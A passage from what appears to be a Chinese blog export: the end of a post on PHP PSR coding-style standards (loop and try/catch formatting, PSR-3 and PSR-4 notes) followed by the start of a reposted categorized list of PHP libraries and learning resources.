<p><em>（4）、<code>for</code>的写法</em><br><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; <span class="number">10</span>; $i++) &#123; <span class="comment">// 注意几个参数之间的空格</span></span><br><span class="line">    <span class="comment">// for body</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></p>
<p><em>（5）、<code>foreach</code> 的写法</em><br><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">foreach</span> ($iterable <span class="keyword">as</span> $key =&gt; $value) &#123; <span class="comment">// 还是空格问题</span></span><br><span class="line">    <span class="comment">// foreach body</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></p>
<p> <em>（6）、<code>try catch</code>的写法</em><br> <div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">// try body</span></span><br><span class="line">&#125; <span class="keyword">catch</span> (FirstExceptionType $e) &#123; <span class="comment">// 同样也是注意空格。</span></span><br><span class="line">    <span class="comment">// catch body</span></span><br><span class="line">&#125; <span class="keyword">catch</span> (OtherExceptionType $e) &#123;</span><br><span class="line">    <span class="comment">// catch body</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></p>
<p>基本用到的就是这些了，其他什么闭包啥的用的不多就不过多的累述了。</p>
<h2 id="3-0-PSR-3规范"><a href="#3-0-PSR-3规范" class="headerlink" title="3.0 PSR-3规范"></a>3.0 <code>PSR-3</code>规范</h2><p>PSR-3规范主要是来规范日志接口(Logger Interface)的，老实讲，其实平常接触的不是特别多，所以就不说了，可以去看官网的<br><span class="exturl" data-url="aHR0cDovL3d3dy5waHAtZmlnLm9yZy9wc3IvcHNyLTMv" title="http://www.php-fig.org/psr/psr-3/">PSR-3<i class="fa fa-external-link"></i></span></p>
<h2 id="PSR-4规范"><a href="#PSR-4规范" class="headerlink" title="PSR-4规范"></a><code>PSR-4</code>规范</h2><p><code>PSR-4</code>规范是刚出没多久的一条新的规范，它也是规范 自动加载(<code>autoload</code>)的，是对<code>PSR</code>-0的修改，属于补充规范，</p>
<blockquote>
<ul>
<li>我简单说下，主要是以下几点： </li>
<li>废除了PSR-0中<em>就是目录分割符的写法，</em>下划线在完全限定类名中是没有特殊含义了。 </li>
<li>类文件名要以 .php 结尾。 </li>
<li>类名必须要和对应的文件名要一模一样，大小写也要一模一样。</li>
</ul>
</blockquote>
<hr>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><span class="exturl" data-url="aHR0cHM6Ly93d3cuenlidWx1by5jb20vcGhwZXIvbm90ZS82NTAzMw==" title="https://www.zybuluo.com/phper/note/65033">https://www.zybuluo.com/phper/note/65033<i class="fa fa-external-link"></i></span><br><span class="exturl" data-url="aHR0cDovL3NlZ21lbnRmYXVsdC5jb20vYS8xMTkwMDAwMDAwMzgwMDA4" title="http://segmentfault.com/a/1190000000380008">http://segmentfault.com/a/1190000000380008<i class="fa fa-external-link"></i></span><br><span class="exturl" data-url="aHR0cDovL3d3dy40d2VpLmNuL2FyY2hpdmVzLzEwMDIxODY=" title="http://www.4wei.cn/archives/1002186">http://www.4wei.cn/archives/1002186<i class="fa fa-external-link"></i></span><br><span class="exturl" data-url="aHR0cDovL3dlbmt1LmJhaWR1LmNvbS92aWV3LzdhMjFlNDRiNDhkN2MxYzcwOGExNDU3Ny5odG1sIzEwMDAyLXRzaW5hLTEtODc4NDMtZTI5YjQ3ODRlZGE1ZDFmNTFmYjBjMmE5N2ExNWRhMDg=" title="http://wenku.baidu.com/view/7a21e44b48d7c1c708a14577.html#10002-tsina-1-87843-e29b4784eda5d1f51fb0c2a97a15da08">http://wenku.baidu.com/view/7a21e44b48d7c1c708a14577.html#10002-tsina-1-87843-e29b4784eda5d1f51fb0c2a97a15da08<i class="fa fa-external-link"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2hmY29ycmllei9maWctc3RhbmRhcmRz" title="https://github.com/hfcorriez/fig-standards">https://github.com/hfcorriez/fig-standards<i class="fa fa-external-link"></i></span></p>
<p>声明：namespace  \Doctrine\Common\<br>调用：\Doctrine\Common\IsolatedClassLoader<br><span class="exturl" data-url="aHR0cHM6Ly9sZWFybmt1LmNvbS9kb2NzL3Bzcg==" title="https://learnku.com/docs/psr">中文翻译文档<i class="fa fa-external-link"></i></span></p>
]]></content>
      <categories>
        <category>php</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>PSR规范</tag>
      </tags>
  </entry>
  <entry>
    <title>「php」php常用库和前端常用组件库(转载)</title>
    <url>/2018/11/28/%E3%80%90php%E3%80%91php%E5%B8%B8%E7%94%A8%E5%BA%93%E5%92%8C%E5%89%8D%E7%AB%AF%E5%B8%B8%E7%94%A8%E7%BB%84%E4%BB%B6%E5%BA%93(%E8%BD%AC%E8%BD%BD)/</url>
    <content><![CDATA[<h1 id="awesome-php"><a href="#awesome-php" class="headerlink" title="awesome-php"></a>awesome-php</h1><p>收集整理一些常用的PHP类库, 资源以及技巧. 以便在工作中迅速的查找所需…</p>
<hr>
<ul>
<li>这个列表中的内容有来自 <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3ppYWRvei9hd2Vzb21lLXBocA==" title="https://github.com/ziadoz/awesome-php">awesome-php<i class="fa fa-external-link"></i></span> 的翻译, 有来自开发者周刊以及个人的积累等.</li>
<li>一个前端组件的列表 <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ppbmd3ZW5UaWFuL2F3ZXNvbWUtZnJvbnRlbmQ=" title="https://github.com/JingwenTian/awesome-frontend">awesome-frontend<i class="fa fa-external-link"></i></span> 推荐</li>
</ul>
<hr>
<h2 id="学习资源"><a href="#学习资源" class="headerlink" title="学习资源"></a>学习资源</h2><blockquote>
<p>PHP相关的有参考价值的社区,博客,网站,文章,书籍,视频等资源<br><a id="more"></a></p>
<ul>
<li><strong>PHP网站(PHP Websites)</strong></li>
</ul>
</blockquote>
<pre><code>- [PHP The Right Way](http://www.phptherightway.com/) - 一个PHP实践的快速参考指导
- [PHP Best Practices](https://phpbestpractices.org/) - 一个PHP最佳实践
- [PHP Weekly News](http://www.phpweekly.com/archive.html) - 一个PHP 周刊
- [Securing PHP](http://securingphp.com/) - 有关PHP安全相关
- [PHP FIG](http://www.php-fig.org/) - PHP框架交互小组
    - [PSR 中文翻译](https://psr.phphub.org)
- [PHP School](http://www.phpschool.io/) - 一个开源的PHP学习资源
- [PHPTrends](http://phptrends.com/) - 一些快速发展的PHP类库检索
</code></pre><ul>
<li><p><strong>其他网站(Other Websites)</strong></p>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly93d3cub3dhc3Aub3JnL2luZGV4LnBocC9NYWluX1BhZ2U=" title="https://www.owasp.org/index.php/Main_Page">The Open Web Application Security Project (OWASP)<i class="fa fa-external-link"></i></span> - 一个开源软件安全社区</li>
<li><span class="exturl" data-url="aHR0cHM6Ly93ZWJzZWMuaW8v" title="https://websec.io/">WebSec IO<i class="fa fa-external-link"></i></span> - 一个web 安全社区</li>
<li><span class="exturl" data-url="aHR0cDovL3NlbXZlci5vcmcvbGFuZy96aC1DTi8=" title="http://semver.org/lang/zh-CN/">Semantic Versioning<i class="fa fa-external-link"></i></span> - 语义化版本</li>
<li><span class="exturl" data-url="aHR0cHM6Ly93d3cuYXRsYXNzaWFuLmNvbS9naXQv" title="https://www.atlassian.com/git/">Atlassian Git Tutorials<i class="fa fa-external-link"></i></span> - 一系列的Git教程</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9zZXJ2ZXJzZm9yaGFja2Vycy5jb20v" title="https://serversforhackers.com/">Servers for Hackers <i class="fa fa-external-link"></i></span> - 有关服务器运维相关</li>
</ul>
</li>
<li><p><strong>PHP书籍(PHP Books)</strong></p>
<ul>
<li><span class="exturl" data-url="aHR0cDovL3Nob3Aub3JlaWxseS5jb20vcHJvZHVjdC8wNjM2OTIwMDMzODY4LmRv" title="http://shop.oreilly.com/product/0636920033868.do">Modern PHP<i class="fa fa-external-link"></i></span> - 作者是<span class="exturl" data-url="aHR0cDovL3d3dy5waHB0aGVyaWdodHdheS5jb20v" title="http://www.phptherightway.com/">PHP 之道<i class="fa fa-external-link"></i></span>的发起人和<span class="exturl" data-url="aHR0cDovL3d3dy5zbGltZnJhbWV3b3JrLmNvbS8=" title="http://www.slimframework.com/">Slim框架<i class="fa fa-external-link"></i></span>的作者<ul>
<li><span class="exturl" data-url="aHR0cDovL2Fib3V0LmFjL2Jvb2tzL21vZGVybi1waHAv" title="http://about.ac/books/modern-php/">Modern PHP（中文版）<i class="fa fa-external-link"></i></span></li>
</ul>
</li>
<li><span class="exturl" data-url="aHR0cDovL2RheWxlcmVlcy5jb20vcGhwLXBhbmRhcy8=" title="http://daylerees.com/php-pandas/">PHP Pandas<i class="fa fa-external-link"></i></span> </li>
</ul>
</li>
<li><p><strong>其他书籍(Other Books)</strong></p>
<ul>
<li><span class="exturl" data-url="aHR0cDovL2xpbnV4Y29tbWFuZC5vcmcv" title="http://linuxcommand.org/">The Linux Command Line<i class="fa fa-external-link"></i></span> - Linux 命令行教程</li>
</ul>
</li>
</ul>
<hr>
<h2 id="依赖管理-Dependency-Management"><a href="#依赖管理-Dependency-Management" class="headerlink" title="依赖管理( Dependency Management )"></a>依赖管理( Dependency Management )</h2><blockquote>
<p>用于依赖管理的包和框架</p>
</blockquote>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9nZXRjb21wb3Nlci5vcmcv" title="https://getcomposer.org/">Composer<i class="fa fa-external-link"></i></span> / <span class="exturl" data-url="aHR0cHM6Ly9wYWNrYWdpc3Qub3JnLw==" title="https://packagist.org/">Packagist<i class="fa fa-external-link"></i></span> - 一个包和依赖管理器.</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2NvbXBvc2VyL2luc3RhbGxlcnM=" title="https://github.com/composer/installers">Composer Installers<i class="fa fa-external-link"></i></span> - 一个多框架Composer库安装器</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZyaWVuZHNPZlBIUC9waWNrbGU=" title="https://github.com/FriendsOfPHP/pickle">pickle<i class="fa fa-external-link"></i></span> - PHP扩展安装器</li>
<li><span class="exturl" data-url="aHR0cDovL21lbG9keS5zZW5zaW9sYWJzLm9yZy8=" title="http://melody.sensiolabs.org/">Melody<i class="fa fa-external-link"></i></span> - A tool to build one file Composer scripts.</li>
</ul>
<h2 id="框架-Frameworks"><a href="#框架-Frameworks" class="headerlink" title="框架( Frameworks )"></a>框架( Frameworks )</h2><blockquote>
<p>Web开发框架</p>
</blockquote>
<ul>
<li><span class="exturl" data-url="aHR0cDovL3N5bWZvbnkuY29tLw==" title="http://symfony.com/">Symfony2<i class="fa fa-external-link"></i></span> - 由独立组件构成的框架(SP2)</li>
<li><span class="exturl" data-url="aHR0cDovL2ZyYW1ld29yay56ZW5kLmNvbS8=" title="http://framework.zend.com/">Zend Framework 2<i class="fa fa-external-link"></i></span> - 同样是由独立组件构成的框架(ZF2)</li>
<li><span class="exturl" data-url="aHR0cDovL2xhcmF2ZWwuY29tLw==" title="http://laravel.com/">Laravel 5<i class="fa fa-external-link"></i></span> - 简洁优雅的PHP Web开发框架(L5)</li>
<li><span class="exturl" data-url="aHR0cDovL2F1cmFwaHAuY29tLw==" title="http://auraphp.com/">Aura PHP<i class="fa fa-external-link"></i></span> - 独立组件的框架</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3lpaXNvZnQveWlpMi8=" title="https://github.com/yiisoft/yii2/">Yii2<i class="fa fa-external-link"></i></span> - 用于开发大型Web应用的高性能PHP框架</li>
<li><span class="exturl" data-url="aHR0cDovL25ldHRlLm9yZy8=" title="http://nette.org/">Nette<i class="fa fa-external-link"></i></span> - 同样是由独立组件构成的框架</li>
<li><span class="exturl" data-url="aHR0cDovL3d3dy5wcGkuaW8v" title="http://www.ppi.io/">PPI Framework 2<i class="fa fa-external-link"></i></span> - 一个交互性的框架</li>
<li><span class="exturl" data-url="aHR0cDovL2Nha2VwaHAub3JnLw==" title="http://cakephp.org/">CakePHP<i class="fa fa-external-link"></i></span> - 一个高效的应用开发框架(CP)</li>
<li><span class="exturl" data-url="aHR0cDovL3BoYWxjb25waHAuY29tL2VuLw==" title="http://phalconphp.com/en/">Phalcon<i class="fa fa-external-link"></i></span> - 一个作为C扩展的框架</li>
<li><span class="exturl" data-url="aHR0cDovL3BocC5uZXQvbWFudWFsL3poL2Jvb2sueWFmLnBocA==" title="http://php.net/manual/zh/book.yaf.php">Yaf<i class="fa fa-external-link"></i></span> - 鸟哥的C扩展的框架<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0xpbmtlZERlc3Rpbnkvc3dvb2xlLXlhZg==" title="https://github.com/LinkedDestiny/swoole-yaf">swoole-yaf<i class="fa fa-external-link"></i></span></li>
</ul>
</li>
</ul>
<h2 id="组件-Components"><a href="#组件-Components" class="headerlink" title="组件( Components )"></a>组件( Components )</h2><ul>
<li><span class="exturl" data-url="aHR0cDovL2F1cmFwaHAuY29tLw==" title="http://auraphp.com/">Aura Components<i class="fa fa-external-link"></i></span> - 一个PHP5.4的组件包</li>
<li><span class="exturl" data-url="aHR0cDovL2hvYS1wcm9qZWN0Lm5ldC9Fbi8=" title="http://hoa-project.net/En/">Hoa Project<i class="fa fa-external-link"></i></span> - 一个PHP组件集合</li>
</ul>
<h2 id="配置-Configuration"><a href="#配置-Configuration" class="headerlink" title="配置( Configuration )"></a>配置( Configuration )</h2><blockquote>
<p>加载配置文件的类库和扩展</p>
</blockquote>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2xhcnVlbmNlL3lhY29uZg==" title="https://github.com/laruence/yaconf">Yaconf<i class="fa fa-external-link"></i></span> - 一个高性能的配置管理扩展</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2hhc3NhbmtoYW4vY29uZmln" title="https://github.com/hassankhan/config">config<i class="fa fa-external-link"></i></span> - 一个轻量级的配置加载器, 支持 PHP, INI, XML, JSON, YAML files</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3plbmRmcmFtZXdvcmsvemVuZC1jb25maWc=" title="https://github.com/zendframework/zend-config">Zend-config<i class="fa fa-external-link"></i></span></li>
</ul>
<h2 id="微框架-Micro-Frameworks"><a href="#微框架-Micro-Frameworks" class="headerlink" title="微框架( Micro Frameworks )"></a>微框架( Micro Frameworks )</h2><blockquote>
<p>微型框架和路由</p>
</blockquote>
<ul>
<li><span class="exturl" data-url="aHR0cDovL3NpbGV4LnNlbnNpb2xhYnMub3JnLw==" title="http://silex.sensiolabs.org/">Silex<i class="fa fa-external-link"></i></span> - 基于Symphony2组件的微型框架<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2ZhYnBvdC9TaWxleC1Ta2VsZXRvbg==" title="https://github.com/fabpot/Silex-Skeleton">Silex Skeleton<i class="fa fa-external-link"></i></span> - 用于Silex的项目框架</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3NpbGV4cGhwL1NpbGV4LVdlYlByb2ZpbGVy" title="https://github.com/silexphp/Silex-WebProfiler">Silex Web Profiler<i class="fa fa-external-link"></i></span> - 用于Silex的Web调试工具条</li>
</ul>
</li>
<li><span class="exturl" data-url="aHR0cDovL3d3dy5zbGltZnJhbWV3b3JrLmNvbS8=" title="http://www.slimframework.com/">Slim<i class="fa fa-external-link"></i></span> - 另一个简单的微型框架<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2NvZGVndXkvU2xpbS1Ta2VsZXRvbg==" title="https://github.com/codeguy/Slim-Skeleton">Slim Skeleton<i class="fa fa-external-link"></i></span> - 用于Slim的框架</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2NvZGVndXkvU2xpbS1WaWV3cw==" title="https://github.com/codeguy/Slim-Views">Slim View<i class="fa fa-external-link"></i></span> - Slim的自定义视图集</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2NvZGVndXkvU2xpbS1NaWRkbGV3YXJl" title="https://github.com/codeguy/Slim-Middleware">Slim Middleware<i class="fa fa-external-link"></i></span> - Slim的自定义中间件集合</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ppbmd3ZW5UaWFuL1NsaW1NVkMtU2tlbGV0b24=" title="https://github.com/JingwenTian/SlimMVC-Skeleton">SlimMVC-Skeleton<i class="fa fa-external-link"></i></span> - Slim基础上实现了MVC及一些组件</li>
</ul>
</li>
<li><span class="exturl" data-url="aHR0cDovL2J1bGxldHBocC5jb20v" title="http://bulletphp.com/">Bullet PHP<i class="fa fa-external-link"></i></span> - 用于构建REST APIs的微型框架</li>
<li><span class="exturl" data-url="aHR0cDovL2x1bWVuLmxhcmF2ZWwuY29tLw==" title="http://lumen.laravel.com/">Lumen<i class="fa fa-external-link"></i></span> - 基于Laravel的微型框架</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FsZXhiaWxiaWUvUHJvdG9u" title="https://github.com/alexbilbie/Proton">Proton<i class="fa fa-external-link"></i></span> - 一个微型PHP框架</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2JpeHVlaHVqaW4vYmxpbms=" title="https://github.com/bixuehujin/blink">blink<i class="fa fa-external-link"></i></span> - 一个为构建 “long running” 服务而生的 Web 微型高性能框架</li>
</ul>
<h2 id="路由-Routers"><a href="#路由-Routers" class="headerlink" title="路由( Routers )"></a>路由( Routers )</h2><ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL25pa2ljL0Zhc3RSb3V0ZQ==" title="https://github.com/nikic/FastRoute">Fast Route<i class="fa fa-external-link"></i></span> - 一个高效路由库</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3RoZXBocGxlYWd1ZS9yb3V0ZQ==" title="https://github.com/thephpleague/route">Route<i class="fa fa-external-link"></i></span> - 基于Fast Route的路由库</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2M5cy9QdXg=" title="https://github.com/c9s/Pux">Pux<i class="fa fa-external-link"></i></span> - 另一个高效的路由库</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2Nocmlzby9rbGVpbi5waHA=" title="https://github.com/chriso/klein.php">Klein<i class="fa fa-external-link"></i></span> - 一个灵活的路由库</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL05vYWhCdXNjaGVyL01hY2F3" title="https://github.com/NoahBuscher/Macaw">Macaw<i class="fa fa-external-link"></i></span> - 一个简单的 PHP 路由器，超级精简、快速而且很性感。</li>
</ul>
<h2 id="模板引擎-Templating"><a href="#模板引擎-Templating" class="headerlink" title="模板引擎( Templating )"></a>模板引擎( Templating )</h2><blockquote>
<p>模板和词法分析的库与工具</p>
</blockquote>
<ul>
<li><span class="exturl" data-url="aHR0cDovL3R3aWcuc2Vuc2lvbGFicy5vcmcv" title="http://twig.sensiolabs.org/">Twig<i class="fa fa-external-link"></i></span> - 一种综合的模板语言</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FzbTg5L3R3aWctY2FjaGUtZXh0ZW5zaW9u" title="https://github.com/asm89/twig-cache-extension">Twig Cache Extension<i class="fa fa-external-link"></i></span> - 用于Twig的模板片段缓存库</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2JvYnRoZWNvdy9tdXN0YWNoZS5waHA=" title="https://github.com/bobthecow/mustache.php">Mustache<i class="fa fa-external-link"></i></span> - PHP实现的Mustache模板语言</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3dlaWVyb3BoaW5uZXkvcGhseV9tdXN0YWNoZQ==" title="https://github.com/weierophinney/phly_mustache">Phly Mustache<i class="fa fa-external-link"></i></span> - 另一个PHP实现的Mustache模板语言</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FybmF1ZC1sYi9NdEhhbWw=" title="https://github.com/arnaud-lb/MtHaml">MtHaml<i class="fa fa-external-link"></i></span> - PHP实现的HAML模板语言</li>
<li><span class="exturl" data-url="aHR0cDovL3BocHRhbC5vcmcv" title="http://phptal.org/">PHPTAL<i class="fa fa-external-link"></i></span> - PHP实现的TAL模板语言</li>
<li><span class="exturl" data-url="aHR0cDovL3BsYXRlc3BocC5jb20v" title="http://platesphp.com/">Plates<i class="fa fa-external-link"></i></span> - 一个原始的PHP模板库</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3B5cm9jbXMvbGV4" title="https://github.com/pyrocms/lex">Lex<i class="fa fa-external-link"></i></span> - 一个轻量级模板解析器</li>
</ul>
<h2 id="静态站生成器-Static-Site-Generators"><a href="#静态站生成器-Static-Site-Generators" class="headerlink" title="静态站生成器( Static Site Generators )"></a>静态站生成器( Static Site Generators )</h2><blockquote>
<p>生成Web页面内容的预处理工具</p>
</blockquote>
<ul>
<li><span class="exturl" data-url="aHR0cDovL3NjdWxwaW4uaW8v" title="http://sculpin.io/">Sculpin<i class="fa fa-external-link"></i></span> - 将Markdown和Twig转换为静态HTML的工具</li>
<li><span class="exturl" data-url="aHR0cDovL3Bocm96bi5pbmZvLw==" title="http://phrozn.info/">Phrozn<i class="fa fa-external-link"></i></span> - 另一款ithub将Textile、Markdown和Twig转为HTML的工具</li>
<li><span class="exturl" data-url="aHR0cDovL3NwcmVzcy55b3N5bWZvbnkuY29tLw==" title="http://spress.yosymfony.com/">Spress<i class="fa fa-external-link"></i></span> </li>
<li><span class="exturl" data-url="aHR0cDovL2NvdXNjb3VzLmlvLw==" title="http://couscous.io/">Couscous<i class="fa fa-external-link"></i></span> - 将Markdown 文档转换成 HTML 发布到Github Page 的工具</li>
</ul>
<h2 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h2><blockquote>
<p>用于HTTP和抓取网站的库</p>
</blockquote>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2d1enpsZS9ndXp6bGU=" title="https://github.com/guzzle/guzzle">Guzzle<i class="fa fa-external-link"></i></span> - 一个完整的HTTP客户端</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2tyaXN3YWxsc21pdGgvQnV6eg==" title="https://github.com/kriswallsmith/Buzz">Buzz<i class="fa fa-external-link"></i></span> - 另一个HTTP客户端</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3JtY2N1ZS9SZXF1ZXN0cw==" title="https://github.com/rmccue/Requests">Requests<i class="fa fa-external-link"></i></span> - 一个简单的HTTP库</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL25hdGVnb29kL2h0dHBmdWw=" title="https://github.com/nategood/httpful">HTTPFul<i class="fa fa-external-link"></i></span> - 一个链式HTTP客户端</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2ZhYnBvdC9Hb3V0dGU=" title="https://github.com/fabpot/Goutte">Goutte<i class="fa fa-external-link"></i></span> - 一个简单的Web抓取器</li>
<li><span class="exturl" data-url="aHR0cDovL3BocC12Y3IuZ2l0aHViLmlvLw==" title="http://php-vcr.github.io/">PHP VCR<i class="fa fa-external-link"></i></span> - 一个录制和回放HTTP请求的库</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3BocC1jdXJsLWNsYXNzL3BocC1jdXJsLWNsYXNz" title="https://github.com/php-curl-class/php-curl-class">php-curl-class<i class="fa fa-external-link"></i></span> - PHP的Curl类</li>
</ul>
<h2 id="中间件-Middlewares"><a href="#中间件-Middlewares" class="headerlink" title="中间件( Middlewares )"></a>中间件( Middlewares )</h2><blockquote>
<p>用于构建应用的类库的中间件</p>
</blockquote>
<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><blockquote>
<p>解析URL的库</p>
</blockquote>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2p3YWdlL3B1cmw=" title="https://github.com/jwage/purl">Purl<i class="fa fa-external-link"></i></span> - 一个URL操作库</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2plcmVteWtlbmRhbGwvcGhwLWRvbWFpbi1wYXJzZXI=" title="https://github.com/jeremykendall/php-domain-parser">PHP Domain Parser<i class="fa fa-external-link"></i></span> - 一个本地的后缀解析器</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3RoZXBocGxlYWd1ZS91cmk=" title="https://github.com/thephpleague/uri">Uri<i class="fa fa-external-link"></i></span> - 一个简单的URL操作库</li>
</ul>
<h2 id="邮件-Email"><a href="#邮件-Email" class="headerlink" title="邮件( Email )"></a>邮件( Email )</h2><blockquote>
<p>用于发送和解析Email的库</p>
</blockquote>
<ul>
<li><span class="exturl" data-url="aHR0cDovL3N3aWZ0bWFpbGVyLm9yZy8=" title="http://swiftmailer.org/">SwiftMailer<i class="fa fa-external-link"></i></span> - 一个邮件程序的解决方案</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL1BIUE1haWxlci9QSFBNYWlsZXI=" title="https://github.com/PHPMailer/PHPMailer">PHPMailer<i class="fa fa-external-link"></i></span> - 另一个邮件程序的解决方案</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL25ldHRlL21haWw=" title="https://github.com/nette/mail">Nette Mail<i class="fa fa-external-link"></i></span> - 一个简单优雅的邮件发送模块</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3RlZGl2bS9GZXRjaA==" title="https://github.com/tedivm/Fetch">Fetch<i class="fa fa-external-link"></i></span> - 一个IMAP库</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3dpbGxkdXJhbmQvRW1haWxSZXBseVBhcnNlcg==" title="https://github.com/willdurand/EmailReplyParser">Email Reply Parser<i class="fa fa-external-link"></i></span> - 一个邮件回复解析器库</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2hlbnJpa2Jqb3JuL1N0YW1waWU=" title="https://github.com/henrikbjorn/Stampie">Stampie<i class="fa fa-external-link"></i></span> - 关于邮件服务的库，比如SendGrid、PostMark、MailGun和Mandrill</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3RpanN2ZXJrb3llbi9Dc3NUb0lubGluZVN0eWxlcw==" title="https://github.com/tijsverkoyen/CssToInlineStyles">CssToInlineStyles<i class="fa fa-external-link"></i></span> - 邮件模板中一个内联的CSS库</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL25vamFja28vZW1haWwtdmFsaWRhdG9y" title="https://github.com/nojacko/email-validator">Email Validator<i class="fa fa-external-link"></i></span> - 一个小巧的邮箱验证库</li>
</ul>
<h2 id="文件操作-Files"><a href="#文件操作-Files" class="headerlink" title="文件操作( Files )"></a>文件操作( Files )</h2><blockquote>
<p>关于文件处理和MIME类型检查</p>
</blockquote>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0tucExhYnMvR2F1ZnJldHRl" title="https://github.com/KnpLabs/Gaufrette">Gaufrette<i class="fa fa-external-link"></i></span> - 一个文件流的抽象层</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZyZW5reU5ldC9GbHlzeXN0ZW0=" title="https://github.com/FrenkyNet/Flysystem">Flysystem<i class="fa fa-external-link"></i></span> - 另一个文件流的抽象层</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2RmbHlkZXYvZGZseWRldi1jYW5hbA==" title="https://github.com/dflydev/dflydev-canal">Canal<i class="fa fa-external-link"></i></span> - 一个检查互联网媒体类型的库</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2RmbHlkZXYvZGZseWRldi1hcGFjaGUtbWltZS10eXBlcw==" title="https://github.com/dflydev/dflydev-apache-mime-types">Apache MIME Types<i class="fa fa-external-link"></i></span> - 一个解析Apache MIME类型的库</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3ZlcnNpb25hYmxlL0ZlcnJldA==" title="https://github.com/versionable/Ferret">Ferret<i class="fa fa-external-link"></i></span> - 一个MIME检测库</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2hvYXByb2plY3QvTWltZQ==" title="https://github.com/hoaproject/Mime">Hoa Mime<i class="fa fa-external-link"></i></span> - 另一个MIME检测库</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2hlbnJpa2Jqb3JuL0x1cmtlcg==" title="https://github.com/henrikbjorn/Lurker">Lurker<i class="fa fa-external-link"></i></span> - 一个资源跟踪库</li>
